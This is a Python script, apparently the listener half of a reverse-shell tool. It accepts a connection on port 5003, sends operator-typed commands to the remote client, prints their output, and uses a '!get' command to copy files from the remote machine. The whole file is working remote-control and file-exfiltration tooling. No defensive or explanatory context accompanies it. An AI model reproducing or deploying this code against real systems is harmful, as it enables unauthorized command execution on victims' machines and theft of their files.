import socket
import os
from time import sleep

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 4
SEPARATOR = "<sep>"

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen()
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    client_socket.send(command.encode())
    head = command.split(" ")[0]
    if command.lower() == "exit":
        break
    elif head == "!get":
        file_socket = client_socket.dup()
        received = file_socket.recv(BUFFER_SIZE).decode()
        filename, filesize = received.split(SEPARATOR)
        filename = os.path.basename(filename)
        filesize = int(filesize)
        filebuffer = bytearray(filesize)
        print(f"{filename} {filesize}")
        with open(filename, "wb") as f:
            sleep(1)
            file_socket.recv_into(filebuffer, (filesize))
            f.write(filebuffer)
            f.close()
            file_socket.close()
        print('File received.')
    else:
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)
s.close()